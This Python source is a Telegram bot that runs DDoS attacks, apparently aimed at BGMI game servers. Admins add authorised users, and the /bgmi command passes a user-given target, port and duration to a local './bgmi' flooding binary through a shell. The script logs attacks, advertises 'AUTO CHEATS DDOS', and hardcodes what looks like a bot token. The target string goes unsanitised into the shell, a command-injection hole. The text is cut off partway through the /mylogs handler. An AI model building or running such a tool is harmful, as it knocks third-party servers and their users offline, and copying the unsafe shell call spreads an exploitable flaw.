#!/usr/bin/python3
#By Indian Watchdogs @Indian_Hackers_Team

import telebot
import subprocess
import requests
import datetime
import os
import sqlite3

# Create a connection to the database
conn = sqlite3.connect('users.db')
cursor = conn.cursor()

# Create tables if they don't exist
cursor.execute('''CREATE TABLE IF NOT EXISTS users (id TEXT PRIMARY KEY)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS logs (user_id TEXT, command TEXT, target TEXT, port INTEGER, time INTEGER)''')

# insert your Telegram bot token here
bot = telebot.TeleBot('7208302677:AAG2oasdKJONuD3nJbhGAeQ-WQxgFpsBbEI')

# Admin user IDs
admin_id = ["7179840825"]

# Function to read user IDs from the database
def read_users():
    cursor.execute('SELECT id FROM users')
    return [row[0] for row in cursor.fetchall()]

# Function to log command to the database
def log_command(user_id, target, port, time):
    cursor.execute('INSERT INTO logs (user_id, command, target, port, time) VALUES (?,?,?,?,?)', (user_id, '/bgmi', target, port, time))
    conn.commit()

# Function to clear logs
def clear_logs():
    cursor.execute('DELETE FROM logs')
    conn.commit()
    response = "Logs cleared successfully"
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    cursor.execute('INSERT INTO logs (user_id, command, target, port, time) VALUES (?,?,?,?,?)', (user_id, command, target, port, time))
    conn.commit()

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in read_users():
                cursor.execute('INSERT INTO users (id) VALUES (?)', (user_to_add,))
                conn.commit()
                response = f"User {user_to_add} Added Successfully."
            else:
                response = "User already exists."
        else:
            response = "Please specify a user ID to add."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in read_users():
                cursor.execute('DELETE FROM users WHERE id=?', (user_to_remove,))
                conn.commit()
                response = f"User {user_to_remove} removed successfully."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = '''Please Specify A User ID to Remove. 
 Usage: /remove <userid>'''
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = clear_logs()
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        cursor.execute('SELECT id FROM users')
        user_ids = [row[0] for row in cursor.fetchall()]
        if user_ids:
            response = "Authorized Users:\n"
            for user_id in user_ids:
                try:
                    user_info = bot.get_chat(int(user_id))
                    username = user_info.username
                    response += f"- @{username} (ID: {user_id})\n"
                except Exception as e:
                    response += f"- User ID: {user_id}\n"
        else:
            response = "No data found"
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        cursor.execute('SELECT * FROM logs')
        logs = cursor.fetchall()
        if logs:
            response = "Recent Logs:\n"
            for log in logs:
                response += f"UserID: {log[0]} | Time: {log[1]} | Command: {log[2]} | Target: {log[3]} | Port: {log[4]} | Time: {log[5]}\n"
        else:
            response = "No data found"
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃🔥🔥🔥.\n\n🎧𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n♟️𝐏𝐨𝐫𝐭: {port}\n🕰️𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n🚬𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nAUTO CHEATS DDOS🎧🕶️"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME = 0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in read_users():
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
                response = "You Are On Cooldown. Please Wait 5min Before Running The /bgmi Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 5000:
                response = "Error: Time interval must be less than 80."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 500"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
        else:
            response = "apply sequence ☑️ :- /bgmi <target> <port> <time>\n AUTO CHEATS DDOS"  # Updated command syntax
    else:
        response = "You Are Not Authorized To Use This Command.\nPLEASE TRY TO CONTACT ADMIN :- AUTOCHEATS "

    bot.reply_to(message, response)

# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in read_users():
        cursor.execute('SELECT * FROM logs WHERE user_id=?', (user_id,))
        user_logs = cursor.fetchall()
        if user_logs:
            response = "Your Command Logs:\n"
            for log in user_logs:
                response += f"UserID: {log[0]} | Time: {log[1]} | Command: {log[2]} | Target: {log[3]} |